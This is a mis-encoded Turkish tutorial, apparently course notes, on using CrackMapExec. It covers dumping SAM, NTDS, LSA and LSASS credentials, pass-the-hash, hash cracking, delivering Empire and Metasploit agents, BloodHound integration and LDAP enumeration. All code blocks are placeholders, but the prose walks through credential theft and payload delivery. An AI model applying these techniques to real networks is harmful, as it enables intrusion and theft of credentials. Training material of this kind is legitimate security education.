Not: Herhangi bir parola yapÄ±landÄ±rÄ±lmamÄ±ÅŸsa, `-p` seÃ§eneÄŸini boÅŸ `(â€œâ€)` olarak ayarlamalÄ±yÄ±z, aksi takdirde bir hata alÄ±rÄ±z

Bu bÃ¶lÃ¼mde, CrackMapExec kullanarak komutlarÄ± yÃ¼rÃ¼tmek iÃ§in Ã¼Ã§ farklÄ± protokol keÅŸfettik ve daha Ã¶nce komutlarÄ± yÃ¼rÃ¼tmek iÃ§in MSSQL'in nasÄ±l kullanÄ±lacaÄŸÄ±nÄ± tartÄ±ÅŸtÄ±k. YazÄ±m sÄ±rasÄ±nda, CrackMapExec komutlarÄ± yÃ¼rÃ¼tmek iÃ§in diÄŸer dÃ¶rt protokolÃ¼ desteklemektedir. Bir sonraki bÃ¶lÃ¼mde CrackMapExec'in kimlik bilgilerini ayÄ±klamak iÃ§in nasÄ±l kullanÄ±lacaÄŸÄ± tartÄ±ÅŸÄ±lacaktÄ±r.


### Gizli Bilgileri Bulma ve Kullanma

Parola Ã§Ä±karma sÃ¶z konusu olduÄŸunda, CrackMapExec oldukÃ§a gÃ¼Ã§lÃ¼dÃ¼r. On workstation ele geÃ§irdiÄŸimizi ve tÃ¼mÃ¼nden kimlik bilgilerini almak iÃ§in LSASS process'inin belleÄŸini dump istediÄŸimizi dÃ¼ÅŸÃ¼nelim; CrackMapExec bunu yapabilir.

Bu bÃ¶lÃ¼mde, CrackMapExec'in Windows kimlik bilgilerini dump iÃ§in sunduÄŸu yÃ¶ntemleri inceleyeceÄŸiz.


### SAM

SAM database, tÃ¼m local kullanÄ±cÄ±larÄ±n kimlik bilgilerini iÃ§erir ve birÃ§ok administrator local kimlik bilgilerini birden fazla makinede yeniden kullandÄ±ÄŸÄ± iÃ§in bunlarÄ± ele geÃ§irmek kritik Ã¶neme sahiptir. `SMB` ve `WinRM` protokolleriyle kullanÄ±labilen `--sam` seÃ§eneÄŸini kullanarak SAM database iÃ§eriÄŸini hÄ±zlÄ± bir ÅŸekilde alabiliriz.

### Dumping SAM

{{CODE_BLOCK_164}}


### NTDS Active Directory Database

Kimlik bilgilerinin alÄ±nabileceÄŸi bir baÅŸka yer de Active Directory veritabanÄ±dÄ±r. ntds.dit dosyasÄ±, kullanÄ±cÄ± objeleri, gruplar ve grup Ã¼yeliÄŸi hakkÄ±ndaki bilgiler de dahil olmak Ã¼zere Active Directory verilerini depolayan bir veritabanÄ±dÄ±r. Ã–zellikle, dosya aynÄ± zamanda domain'deki tÃ¼m kullanÄ±cÄ±lar iÃ§in parola hash'lerini de saklar (ve hatta bazen bir veya daha fazla hesap iÃ§in [reversible encryption](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) etkinleÅŸtirilmiÅŸse aÃ§Ä±k metin parolalarÄ±nÄ± da saklar). Bir Domain Admin hesabÄ±na veya bir replikasyon/DCSync gerÃ§ekleÅŸtirme ayrÄ±calÄ±klarÄ±na sahip baÅŸka bir hesaba eriÅŸimimiz varsa, bir Domain Controller'dan hash'leri dÃ¶kebiliriz

Hash'leri dump etmek iÃ§in `--ntds` seÃ§eneÄŸini kullanmamÄ±z gerekir, aÅŸaÄŸÄ±daki Ã¶rnekte `robert` kullanÄ±cÄ±sÄ± bir Domain Admin deÄŸildir, ancak `replikasyon` gerÃ§ekleÅŸtirme ayrÄ±calÄ±klarÄ±na sahiptir.

### Domain Controller Ã¼zerinden NTDS database dump etme

{{CODE_BLOCK_165}}

`--ntds` seÃ§eneÄŸini kullanÄ±rken `--user` ve `--enabled` seÃ§eneklerini dahil edebiliriz. EÄŸer `--user` kullanÄ±rsak ayÄ±klamak istediÄŸimiz kullanÄ±cÄ±yÄ± belirtebiliriz. KRBTGT hesabÄ± iÃ§in hash dump alalÄ±m.

### YalnÄ±zca KRBTGT HesabÄ±nÄ±n Dump Edilmesi

{{CODE_BLOCK_166}}

EÄŸer `--enabled` olarak belirtirsek, sadece ekranda `etkin` olan kullanÄ±cÄ±larÄ± gÃ¶sterecek ve bize etkin kullanÄ±cÄ±larÄ±n listesini Ã§Ä±karma seÃ§eneÄŸi sunacaktÄ±r.


### YalnÄ±zca Enabled HesaplarÄ± GÃ¶sterme

{{CODE_BLOCK_167}}


### Secrets (hash'leri) kullanma

Elde ettiÄŸimiz ÅŸifreler NTLM hash'leridir. Hash'leri kÄ±rmayÄ± deneyebilir veya parolayÄ± kÄ±rmadan kullanÄ±cÄ± olarak kimlik doÄŸrulamasÄ± yapmak iÃ§in `Pass the Hash` tekniÄŸini kullanabiliriz. 

CrackMapExec, parola yerine kimlik doÄŸrulama yÃ¶ntemi olarak bir NTLM hash'i gerektiren `-H` seÃ§eneÄŸine sahiptir:

### Using NTLM Hashes

{{CODE_BLOCK_168}}

NTLM kimlik doÄŸrulamasÄ± SMB, WinRM , RDP, LDAP ve MSSQL protokolleri iÃ§in desteklenir


### LSA Secrets/Cached Credentials

CrackMapExec, remote makineden herhangi bir agent Ã§alÄ±ÅŸtÄ±rmadan hash dump iÅŸlemi gerÃ§ekleÅŸtiren `impacket-secretsdump`'tan alÄ±nmÄ±ÅŸ `--lsa` seÃ§eneÄŸiyle birlikte gelir. Bu seÃ§enek, Cached credentials, local machine key list, [Data Protection API (DPAPI)](https://en.wikipedia.org/wiki/Data_Protection_API) keys ve service credentials dahil olmak Ã¼zere LSA Secrets'Ä± dump eder.

`LSA Secrets`, Windows'ta Local Security Authority (LSA) tarafÄ±ndan kullanÄ±lan kritik veriler iÃ§in benzersiz bir korumalÄ± depolama alanÄ±dÄ±r. LSA, bir sistemin local security policy'sini yÃ¶netmek, denetlemek, kimlik doÄŸrulamak, kullanÄ±cÄ±larÄ±n sistemde oturumunu aÃ§mak, Ã¶zel verileri depolamak vb. iÃ§in tasarlanmÄ±ÅŸtÄ±r. KullanÄ±cÄ±larÄ±n ve sistemlerin hassas verileri gizli dosyalarda saklanÄ±r. [DPAPI](https://en.wikipedia.org/wiki/Data_Protection_API) anahtarlarÄ± verileri ÅŸifrelemek iÃ§in kullanÄ±lÄ±r


### LSA'yÄ± inceleyin
{{CODE_BLOCK_169}}


`DCC2$` ile baÅŸlayan hash formatÄ± `Domain Cached Credentials 2 (DCC2)`, MS Cache 2'dir. Bu hash'ler, zayÄ±f bir parola belirlenmiÅŸse `Hashcat` kullanÄ±larak kÄ±rÄ±labilir Ã§Ã¼nkÃ¼ bu algoritma `NTLM`'den Ã§ok daha gÃ¼Ã§lÃ¼dÃ¼r. AyrÄ±ca, Domain Cached Credential hash'leri `Pas the Hash` saldÄ±rÄ±sÄ± iÃ§in kullanÄ±lamaz. BunlarÄ± kÄ±rmak iÃ§in, domain ve kullanÄ±cÄ± adÄ±nÄ± kaldÄ±rmamÄ±z, `$DCC2$` 'den sonraki deÄŸeri almamÄ±z ve Hashcat modÃ¼l 2100'Ã¼ kullanmamÄ±z gerekir.


### Cracking Hashes

{{CODE_BLOCK_170}}


{{CODE_BLOCK_171}}


### LSASS'tan Secrets elde etme

LSASS prosesinin belleÄŸi, Windows parolalarÄ±nÄ± `aÃ§Ä±k metin` olarak veya `NTLM` veya `AES256/AES128` gibi diÄŸer hash biÃ§imlerini iÃ§erir. BelleÄŸi dump etmek, bir domain administrator bulana kadar daha fazla hesap bulmak iÃ§in etkili bir yol olabilir.

CrackMapExec, LSASS process belleÄŸinin iÃ§eriÄŸini dump etmek iÃ§in Ã§eÅŸitli modÃ¼ller iÃ§erir. Bunlardan bazÄ±larÄ±nÄ± gÃ¶relim:

* [Lsassy](https://github.com/login-securite/lsassy) Python aracÄ±, bir dizi host Ã¼zerindeki kimlik bilgilerini remote olarak ayÄ±klamak iÃ§in kullanÄ±lÄ±r. Bu [blog](https://en.hackndo.com/remote-lsass-dump-passwords/) yazÄ±sÄ± nasÄ±l Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± aÃ§Ä±klamaktadÄ±r. Bu araÃ§, bir LSASS dump'Ä±ndaki gerekli baytlarÄ± remote okumak iÃ§in `Impacket` projesini ve kimlik bilgilerini Ã§Ä±karmak iÃ§in `pypykatz` kullanÄ±r.


### Lsassy Module

{{CODE_BLOCK_172}}

* Procdump, LSASS process dump oluÅŸturmak iÃ§in Sysinternals'tan Microsoft `Procdump`'Ä± ve kimlik bilgilerini Ã§Ä±karmak iÃ§in `pypykatz`'Ä± kullanÄ±r.


### Procdump Module

{{CODE_BLOCK_173}}


* **[HandleKatz](https://github.com/codewhitesec/HandleKatz)** aracÄ±, **LSASS**'e ait kopyalanmÄ±ÅŸ **handle**'larÄ±n kullanÄ±mÄ±nÄ± gÃ¶stererek, aynÄ± **process**'in **gizlenmiÅŸ** bir bellek dump'Ä±nÄ± oluÅŸturur.


### Handlekatz Module

{{CODE_BLOCK_174}}


* **[Nanodump](https://github.com/helpsystems/nanodump)**, **LSASS process**'inin **minidump**'Ä±nÄ± oluÅŸturan esnek bir araÃ§tÄ±r. **LSASS**'e bir **handle** aÃ§mak tespit edilebileceÄŸinden, **Nanodump** mevcut **handle**'larÄ± arayabilir. EÄŸer bir **handle** bulunursa, bunu kopyalayÄ±p **minidump** oluÅŸturmak iÃ§in kullanÄ±r. Ancak, bÃ¶yle bir **handle** bulunacaÄŸÄ±nÄ±n garantisi yoktur.

Not : **Handle**, bir **process**'in **dosya, bellek bÃ¶lgesi veya baÅŸka bir kaynak** ile etkileÅŸime geÃ§mesini saÄŸlayan **benzersiz bir tanÄ±mlayÄ±cÄ±dÄ±r**.

### Nanodump Module

{{CODE_BLOCK_175}}

Bu bÃ¶lÃ¼mde bir bilgisayardan veya domain'den kimlik bilgilerini almak iÃ§in farklÄ± yÃ¶ntemler gÃ¶sterilmektedir. Bir sonraki bÃ¶lÃ¼mde CrackMapExec'in bir C2 framework ile birlikte kullanÄ±mÄ± incelenecektir.

---


### Bir **C2 Framework** iÃ§inde **session**'larÄ± alma.

CrackMapExec ile ilginÃ§ olabilecek bir ÅŸey, birden fazla hedefi tehlikeye attÄ±ÄŸÄ±mÄ±zda, daha fazla recon yapmak veya `Empire` veya `Metasploit` gibi bir C2 Framework kullanarak Ã§alÄ±ÅŸmak isteyebiliriz. Her hedef makinede bir payload Ã§alÄ±ÅŸtÄ±rmak ve C2'mize bir `agent` almak iÃ§in CrackMapExec'i kullanabiliriz.

Bu bÃ¶lÃ¼mde CME'yi PowerShell Empire ve Metasploit framework ile entegre eden iki modÃ¼l ele alÄ±nacaktÄ±r. AyrÄ±ca farklÄ± bir C2 framework'Ã¼ kullanÄ±rsak bir alternatif de keÅŸfedeceÄŸiz.


### Empire

Web sitelerinde saÄŸlanan [kÄ±lavuzu](https://bc-security.gitbook.io/empire-wiki/quickstart/installation) kullanarak [Empire framework](https://github.com/BC-SECURITY/Empire)'Ã¼ yÃ¼kleyerek baÅŸlayacaÄŸÄ±z


### Empire Server'Ä± Kurun ve BaÅŸlatÄ±n

{{CODE_BLOCK_176}}

Daha sonra Empire'Ä± seÃ§tiÄŸimiz kullanÄ±cÄ± adÄ± ve ÅŸifre ile Ã§alÄ±ÅŸtÄ±rmamÄ±z gerekiyor. Biz `empireadmin` kullanÄ±cÄ± adÄ±nÄ± ve `asdasd123` ÅŸifresini kullanacaÄŸÄ±z! .


### Empire'Ä± Ã–zel KullanÄ±cÄ± AdÄ± ve Parola ile Ã‡alÄ±ÅŸtÄ±rma

{{CODE_BLOCK_177}}

ArdÄ±ndan, CrackMapExec yapÄ±landÄ±rma dosyasÄ±nÄ± ve Empire client yapÄ±landÄ±rma dosyasÄ±nÄ± seÃ§tiÄŸimiz kullanÄ±cÄ± adÄ± ve parolayla eÅŸleÅŸecek ÅŸekilde dÃ¼zenlememiz gerekir.

CrackMapExec yapÄ±landÄ±rma dosyasÄ± varsayÄ±lan olarak `~/.cme/cme.conf` adresinde bulunur. `[Empire]` seÃ§eneÄŸini `empireadmin` kullanÄ±cÄ± adÄ± ve `asdasd123` ÅŸifresiyle eÅŸleÅŸecek ÅŸekilde deÄŸiÅŸtirmemiz gerekiyor! . VarsayÄ±lan olarak, Empire local server `1337` portunda Ã§alÄ±ÅŸÄ±r. CrackMapExec yapÄ±landÄ±rma dosyasÄ±nda deÄŸiÅŸtirilebilir.


### CrackMapExec Configuration File

{{CODE_BLOCK_178}}


AynÄ± ÅŸeyi Empire yapÄ±landÄ±rma dosyasÄ± iÃ§in de yapmamÄ±z gerekiyor. Dosya `empire/client/config.yaml` adresinde bulunur:


### Ä°nceleme

{{CODE_BLOCK_179}}


YapÄ±landÄ±rma dosyalarÄ± deÄŸiÅŸtirildikten sonra, Empire client ile Empire sunucusuna baÄŸlanmalÄ±yÄ±z

{{CODE_BLOCK_180}}

Åimdi listener'Ä± ayarlamamÄ±z gerekiyor ve host'u IP adresimize ve Port'u da aracÄ±nÄ±n baÄŸlanacaÄŸÄ± TCP 8001'e ayarlayacaÄŸÄ±z.

### Empire Client Connection

{{CODE_BLOCK_181}}


### Empire Setting up IP and Port

{{CODE_BLOCK_182}}

ArtÄ±k listener'Ä±mÄ±z Ã§alÄ±ÅŸÄ±yor ve `empire_exec` modÃ¼lÃ¼ ile Empire'a bir `agent` almak iÃ§in CrackMapExec'i kullanabiliriz. AyarladÄ±ÄŸÄ±mÄ±z listener olan `LISTENER=http` seÃ§eneÄŸini eklememiz gerekiyor.


### CrackMapExec ModÃ¼lÃ¼nÃ¼ Kullanma empire_exec

{{CODE_BLOCK_183}}


Bunu Ã§alÄ±ÅŸtÄ±rdÄ±ÄŸÄ±mÄ±zda, PowerShell Empire'da yeni bir agent gÃ¶rmeliyiz.

![Pasted image 20241203121035.png](/img/user/resimler/Pasted%20image%2020241203121035.png)


### Metasploit

AynÄ± ÅŸeyi CrackMapExec modÃ¼lÃ¼ `web_delivery` kullanarak Metasploit Framework Ã¼zerinde de yapabiliriz. Metasploit Framework'te `web_delivery` modÃ¼lÃ¼nÃ¼ yapÄ±landÄ±rmamÄ±z ve saÄŸlanan URL'yi CrackMapExec modÃ¼lÃ¼mÃ¼ze bir parametre olarak kullanmamÄ±z gerekir. Msfconsole'u baÅŸlatalÄ±m ve `web_delivery` handler'Ä±nÄ± yapÄ±landÄ±ralÄ±m


### Metasploit Configure web_delivery Handler

{{CODE_BLOCK_184}}

Metasploit'te web delivery handler yapÄ±landÄ±rÄ±ldÄ±ktan sonra web_delivery modÃ¼lÃ¼nÃ¼ kullanabiliriz. `URL` ve `PAYLOAD` olmak Ã¼zere iki seÃ§eneÄŸi destekler. URL seÃ§eneÄŸini Metasploit tarafÄ±ndan saÄŸlanan URL ile ayarlamamÄ±z gerekir ve PAYLOAD seÃ§eneÄŸi seÃ§tiÄŸimiz payload mimarisine karÅŸÄ±lÄ±k gelir. EÄŸer `x64` kullanÄ±yorsak, `x64` varsayÄ±lan deÄŸer olduÄŸu iÃ§in bu seÃ§eneÄŸi atlayabiliriz ya da `PAYLOAD=64` kullanabiliriz. EÄŸer `32 bit` payload kullanÄ±yorsak `PAYLOAD=32` seÃ§eneÄŸini ayarlamamÄ±z gerekir. Åimdi bunu Ã§alÄ±ÅŸÄ±rken gÃ¶relim:


### CrackMapExec web_delivery Module

{{CODE_BLOCK_185}}

{{CODE_BLOCK_186}}

Metasploit'te yeni bir oturum gÃ¶rmeliyiz:

![Pasted image 20241203121353.png](/img/user/resimler/Pasted%20image%2020241203121353.png)


### Other C2 Frameworks

BaÅŸka bir C2 Framework kullanmak istediÄŸimizde, **Command Execution** bÃ¶lÃ¼mÃ¼nde bahsedilen (SMB, WinRM, SSH) yÃ¶ntemleri kullanarak aynÄ± sonucu elde edebiliriz. Ã–rneÄŸin, bir **PowerShell** payload'u oluÅŸturabilir, bu payload'u bir web sunucusuna kaydedebilir ve payload'u indirip Ã§alÄ±ÅŸtÄ±rmak iÃ§in **-X** seÃ§eneÄŸiyle bir PowerShell komutu Ã§alÄ±ÅŸtÄ±rabiliriz. AyrÄ±ca, iÅŸlemi arka planda yÃ¼rÃ¼tmek iÃ§in **`--no-output`** seÃ§eneÄŸini seÃ§memiz gerekecektir.

Ã–rnek olarak Metasploit'i kullanalÄ±m ve modÃ¼lÃ¼ kullanmak yerine web_delivery payload'unda saÄŸlanan PowerShell script'ini kopyalamayÄ± deneyelim:

![Pasted image 20241203122258.png](/img/user/resimler/Pasted%20image%2020241203122258.png)

Bu bÃ¶lÃ¼m, CrackMapExec'i C2 Frameworks gibi diÄŸer bilgisayar korsanlÄ±ÄŸÄ± araÃ§larÄ±yla nasÄ±l kullanabileceÄŸimizi araÅŸtÄ±rÄ±yor. Bir sonraki bÃ¶lÃ¼mde CrackMapExec'in BloodHound ile nasÄ±l entegre edileceÄŸi incelenecektir.


---

### Bloodhound Entegrasyonu

BloodHound, hem saldÄ±rganlar hem de savunmacÄ±lar tarafÄ±ndan alan gÃ¼venliÄŸini analiz etmek iÃ§in kullanÄ±lan aÃ§Ä±k kaynaklÄ± bir araÃ§tÄ±r. AraÃ§, domain'den toplanan bÃ¼yÃ¼k miktarda veriyi alÄ±r. Ä°liÅŸkiyi gÃ¶rsel olarak temsil etmek ve geleneksel numaralandÄ±rma ile tespit edilmesi zor veya imkansÄ±z olan domain saldÄ±rÄ± yollarÄ±nÄ± belirlemek iÃ§in grafik teorisini kullanÄ±r. Bu bÃ¶lÃ¼mde Bloodhound'a aÅŸina olduÄŸunuzu varsayÄ±yoruz. 


### **BloodHound**'da **Owned** olarak iÅŸaretleme.

BloodHound'da bir Node'u (user, grup, computer vb.) manuel olarak ele geÃ§irilmiÅŸ (owned) olarak iÅŸaretleyebiliriz. Bunu yapmak iÃ§in node'a saÄŸ tÄ±klayÄ±p **`Mark X as Owned`** seÃ§eneÄŸine tÄ±klamamÄ±z yeterlidir. Bu, ele geÃ§irdiÄŸimiz kullanÄ±cÄ±larÄ± ve bilgisayarlarÄ± takip etmek aÃ§Ä±sÄ±ndan faydalÄ±dÄ±r, Ã¶zellikle bÃ¼yÃ¼k bir organizasyonla Ã§alÄ±ÅŸÄ±rken. AyrÄ±ca, **`Shortest Path from Owned Principals`** (Ele GeÃ§irilmiÅŸ Principal'dan En KÄ±sa Yol) veya **`Shortest Paths to Domain Admins from Owned Principals`** (Ele GeÃ§irilmiÅŸ Principal'dan Domain Adminlerine En KÄ±sa Yollar) gibi bir BloodHound cypher sorgusu gerÃ§ekleÅŸtirmek istediÄŸimizde de kullanÄ±ÅŸlÄ±dÄ±r.

CrackMapExec'i, ele geÃ§irdiÄŸimiz herhangi bir user veya computer'Ä± BloodHound veritabanÄ±nda `owned` olarak iÅŸaretleyecek ÅŸekilde yapÄ±landÄ±rabiliriz. Bunu yapmak iÃ§in, `~/.cme/cme.conf` adresinde bulunan CrackMapExec yapÄ±landÄ±rma dosyasÄ±nÄ± aÅŸaÄŸÄ±daki seÃ§eneklerle deÄŸiÅŸtirmemiz gerekir:

* Bloodhound yapÄ±landÄ±rma seÃ§eneÄŸi `bh_enabled`'Ä± `True` olarak ayarlayÄ±n.
* `bh_uri`'yi Bloodhound veritabanÄ± `IP` adresimize ayarlayÄ±n.
* `bh_port`'u veritabanÄ± `portuna` ayarlayÄ±n
* Kimlik bilgilerini bloodhound veritabanÄ±yla eÅŸleÅŸecek ÅŸekilde ayarlayÄ±n: kullanÄ±cÄ± adÄ± `neo4j` ve ÅŸifre `asdasd123` (VeritabanÄ±nÄ±za karÅŸÄ±lÄ±k geleni kullandÄ±ÄŸÄ±nÄ±zdan emin olun).

YapÄ±landÄ±rma aÅŸaÄŸÄ±daki gibi gÃ¶rÃ¼nmelidir:


### Configuring BloodHound Database

{{CODE_BLOCK_187}}

Not: BaÄŸlandÄ±ÄŸÄ±nÄ±z BloodHound veritabanÄ±na karÅŸÄ±lÄ±k gelen kullanÄ±cÄ± adÄ± ve parolayÄ± kullandÄ±ÄŸÄ±nÄ±zdan emin olun.

### Bloodhound Verilerinin ToplanmasÄ±

BloodHound verilerini toplamak iÃ§in CrackMapExec kullanarak SharpHound'u Ã§alÄ±ÅŸtÄ±racak ve ardÄ±ndan dosyayÄ± saldÄ±rÄ± hostumuza aktaracaÄŸÄ±z.

### BloodHound verilerinin toplanmasÄ±

{{CODE_BLOCK_188}}

{{CODE_BLOCK_189}}

{{CODE_BLOCK_190}}

{{CODE_BLOCK_191}}

Åimdi BloodHound'u aÃ§mamÄ±z ve verileri iÃ§e aktarmamÄ±z gerekiyor.


### BloodHound'da KullanÄ±cÄ±larÄ± Owned Olarak Ayarlama

Veriler iÃ§e aktarÄ±ldÄ±ktan sonra, `robert` kullanÄ±cÄ±sÄ± ile baÄŸlanmaya Ã§alÄ±ÅŸÄ±rsak, kullanÄ±cÄ±yÄ± BloodHound veritabanÄ±nda owned olunan olarak ayarlayacaktÄ±r.

### KullanÄ±cÄ± BloodHound'da Owned Olarak Eklendi

{{CODE_BLOCK_192}}

Birden fazla kullanÄ±cÄ±sÄ± olan bir makineyi tehlikeye atarsak da aynÄ± ÅŸey olacaktÄ±r. Bulunan tÃ¼m yeni kullanÄ±cÄ±larÄ± owned olarak ayarlayacaktÄ±r.

### Procdump ModÃ¼lÃ¼ ile KullanÄ±cÄ±larÄ± Owned Olarak Ekleme

{{CODE_BLOCK_193}}


Not: TÃ¼m CrackMapExec seÃ§enekleri BloodHound veritabanÄ± ile senkronize olmayacaktÄ±r. Ã–rneÄŸin, `--ntds` veya `--lsa` seÃ§eneklerini denersek, kullanÄ±cÄ±larÄ± veritabanÄ±nda sahip olunan olarak iÅŸaretlemez, ancak `procdump` veya `lsassy` gibi modÃ¼ller kullanÄ±cÄ±larÄ± sahip olunan olarak iÅŸaretler.


### BloodHound'da BilgisayarlarÄ± Owned Olarak Ayarlama

YazÄ±m sÄ±rasÄ±nda, BloodHound entegrasyonu yalnÄ±zca user'larÄ± Owned olarak iÅŸaretlemektedir. Bir `computer` owned olarak iÅŸaretlemek istiyorsak, `bh_owned` modÃ¼lÃ¼nÃ¼ ve `neo4j` veritabanÄ±mÄ±zÄ±n kullanÄ±cÄ± adÄ± ve ÅŸifresini kullanabiliriz. AÅŸaÄŸÄ±daki Ã¶rnekte, diÄŸer varsayÄ±lan deÄŸerler neo4j veritabanÄ±mÄ±zla eÅŸleÅŸtiÄŸi iÃ§in yalnÄ±zca `PASS` seÃ§eneÄŸini ekleyeceÄŸiz.

{{CODE_BLOCK_194}}

{{CODE_BLOCK_195}}

BloodHound'un CrackMapExec'e entegrasyonu, bÃ¼yÃ¼k aÄŸlarla uÄŸraÅŸÄ±rken birÃ§ok seÃ§enek sunar ve mÃ¼ÅŸterilerimizle paylaÅŸmak istememiz durumunda veritabanÄ±nÄ± gÃ¼ncellemenin hÄ±zlÄ± bir yoludur. Bir sonraki bÃ¶lÃ¼mde, CrackMapExec'te mevcut olan bazÄ± popÃ¼ler modÃ¼llerle Ã§alÄ±ÅŸacaÄŸÄ±z.


----
### Popular Modules

CrackMapExec ile ilgili en heyecan verici ÅŸeylerden biri, modÃ¼ler olmasÄ± ve herkesin modÃ¼ller oluÅŸturmasÄ±na ve bunlarÄ± araca katkÄ±da bulunmasÄ±na izin vermesidir. CrackMapExec, exploit ve exploit sonrasÄ± gÃ¶revleri kolaylaÅŸtÄ±rmak iÃ§in iÅŸlemler gerÃ§ekleÅŸtirmemizi saÄŸlayan 50'den fazla modÃ¼le sahiptir. Bu bÃ¶lÃ¼mde LDAP ve SMB protokolleri iÃ§in bu modÃ¼llerden bazÄ±larÄ± incelenecektir.


### LDAP Protocol Modules

LDAP protokolÃ¼ yaygÄ±n olarak Domain Controller'lar ile etkileÅŸime geÃ§memizi ve onlardan bilgi almamÄ±zÄ± saÄŸlar. Active Directory'den ilginÃ§ bilgiler Ã§Ä±karmamÄ±zÄ± saÄŸlayacak bazÄ± modÃ¼lleri gÃ¶zden geÃ§irelim.


### **LDAP Module - get-network**

`get-network` modÃ¼lÃ¼ [Active Directory Integrated DNS dump](https://github.com/dirkjanm/adidnsdump)'Ä±  temel alÄ±r. VarsayÄ±lan olarak, Active Directory'deki herhangi bir kullanÄ±cÄ±, `zone transferine` benzer ÅŸekilde Domain veya Forest DNS bÃ¶lgelerindeki tÃ¼m DNS kayÄ±tlarÄ±nÄ± numaralandÄ±rabilir. Bu araÃ§, internal aÄŸlarÄ±n yeniden yapÄ±landÄ±rÄ±lmasÄ± amacÄ±yla bÃ¶lgedeki tÃ¼m DNS kayÄ±tlarÄ±nÄ±n numaralandÄ±rÄ±lmasÄ±nÄ± ve dÄ±ÅŸa aktarÄ±lmasÄ±nÄ± saÄŸlar.

ModÃ¼lÃ¼ kullanmanÄ±n Ã¼Ã§ (3) yolu vardÄ±r:
* Sadece IP adresini almak.
* Sadece domain isimlerini al.
* Her ikisini de al (IP ve domain adlarÄ±).

VarsayÄ±lan olarak, herhangi bir seÃ§enek belirtmezsek, modÃ¼l yalnÄ±zca IP adresini alacaktÄ±r. `ALL=true` seÃ§eneÄŸini seÃ§ersek, hem IP hem de domain adlarÄ±nÄ± alÄ±r ve `ONLY_HOSTS=true` olarak belirtirsek, yalnÄ±zca FQDN'yi alÄ±rÄ±z.


### DNS Sunucusundan (Record) KayÄ±tlarÄ± Alma

{{CODE_BLOCK_196}}

{{CODE_BLOCK_197}}

{{CODE_BLOCK_198}}


Not: Bu yazÄ±nÄ±n yazÄ±ldÄ±ÄŸÄ± zamanda, modÃ¼l **`adidnsdump`** aracÄ±yla bazÄ± farklÄ±lÄ±klar gÃ¶stermektedir. SonuÃ§lar, hesaplar arasÄ±nda farklÄ±lÄ±k gÃ¶sterebilir.


### LDAP Module - laps

Bir baÅŸka harika modÃ¼l de `laps` . `Local Administrator Password Solution (LAPS)`, domain'e baÄŸlÄ± bilgisayarlarda local hesap parolalarÄ±nÄ±n yÃ¶netimini saÄŸlar. Parolalar Active Directory'de (AD) saklanÄ±r ve ACL'ler tarafÄ±ndan korunur, bÃ¶ylece yalnÄ±zca belirli kullanÄ±cÄ±lar bunlarÄ± okuyabilir veya `parola sÄ±fÄ±rlama` talebinde bulunabilir. Laps modÃ¼lÃ¼ ile bir hesabÄ±n okuma eriÅŸimine sahip olduÄŸu tÃ¼m bilgisayarlarÄ± alabiliriz. Bir bilgisayarÄ± belirtmek iÃ§in `COMPUTER` seÃ§eneÄŸini de kullanabilir veya benzer ada sahip birkaÃ§ bilgisayarÄ± almak iÃ§in bir wildcard karakterle birlikte kullanabiliriz.


### LAPS ModÃ¼lÃ¼ ParolalarÄ±n AlÄ±nmasÄ±

{{CODE_BLOCK_199}}

{{CODE_BLOCK_200}}


Not: KullanÄ±lan parola bir Ã¶rnektir. Hedef hostta Ã§alÄ±ÅŸmayacaktÄ±r

### LDAP ModÃ¼lÃ¼ - MAQ

**Machine Account Quota (MAQ)**, **[MS-DS-Machine-AccountQuota](https://learn.microsoft.com/en-us/windows/win32/adschema/a-ms-ds-machineaccountquota)** **attribute**'Ã¼ ile temsil edilen ve varsayÄ±lan olarak bir **user**'Ä±n bir **domain** iÃ§inde oluÅŸturabileceÄŸi **computer account** sayÄ±sÄ±nÄ± belirten bir **domain level attribute**'tÃ¼r.

**[Resource Based Constrained Delegation](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution)** gibi bazÄ± **attack** senaryolarÄ±nda **domain** iÃ§inde bir **machine** oluÅŸturmak gerekebilir, bu yÃ¼zden **account machine quota attribute**'Ã¼nÃ¼ **enumerate** etmek Ã¶nemlidir.


### Machine Quota Module

{{CODE_BLOCK_201}}


### LDAP Module - daclread

Bir baÅŸka harika modÃ¼l ise bir veya birden fazla object'in `DACL`'lerini okumamÄ±zÄ± ve dÄ±ÅŸa aktarmamÄ±zÄ± saÄŸlayan `daclread`'dir. Bu modÃ¼l Active Directory eriÅŸimini numaralandÄ±rmamÄ±zÄ± saÄŸlayacaktÄ±r. AÅŸaÄŸÄ±daki seÃ§eneklere sahiptir:

### daclread Module Options

{{CODE_BLOCK_202}}

Diyelim ki **`grace`** hesabÄ±nÄ±n tÃ¼m **ACE**'lerini okumak istiyoruz. Bunun iÃ§in **`TARGET`** seÃ§eneÄŸini ve **`ACTION`** olarak **read** kullanabiliriz.


### Grace KullanÄ±cÄ±sÄ±nÄ±n DACL'sini Oku

{{CODE_BLOCK_203}}


AyrÄ±ca belirli haklarÄ± da arayabiliriz, Ã¶rneÄŸin hangi **principal**'larÄ±n **DCSync** haklarÄ±na sahip olduÄŸunu. Bunun iÃ§in **`TARGET_DN`** seÃ§eneÄŸini kullanarak **distinguished domain name (DN)** belirtmemiz, **`ACTION`** olarak **read** seÃ§eneÄŸini seÃ§memiz ve aramak istediÄŸimiz haklarÄ± **`RIGHTS`** seÃ§eneÄŸiyle belirlememiz gerekir.

### DCSync Rights'a Sahip KullanÄ±cÄ±larÄ± Arama

{{CODE_BLOCK_204}}



Ã‡Ä±ktÄ±da gÃ¶sterildiÄŸi gibi, `ACE[4]` `robert` kullanÄ±cÄ±sÄ±nÄ±n hedef domain'de `DCSync` haklarÄ±na sahip olduÄŸunu gÃ¶sterir.

LDAP'ta birkaÃ§ modÃ¼l daha kullanabiliriz. ModÃ¼llerin tam listesini gÃ¶rmek iÃ§in `-L` seÃ§eneÄŸini kullanabiliriz.

### LDAP Protocol Modules

{{CODE_BLOCK_205}}


### SMB Protocol Modules

SMB protokolÃ¼nde daha fazla modÃ¼l mevcuttur. CrackMapExec modÃ¼lÃ¼nde yaptÄ±ÄŸÄ±mÄ±z ÅŸeylerin Ã§oÄŸu SMB protokolÃ¼nÃ¼ kullanÄ±r. Ä°lginÃ§ bilgiler elde etmemizi saÄŸlayacak bazÄ± modÃ¼lleri gÃ¶zden geÃ§irelim.

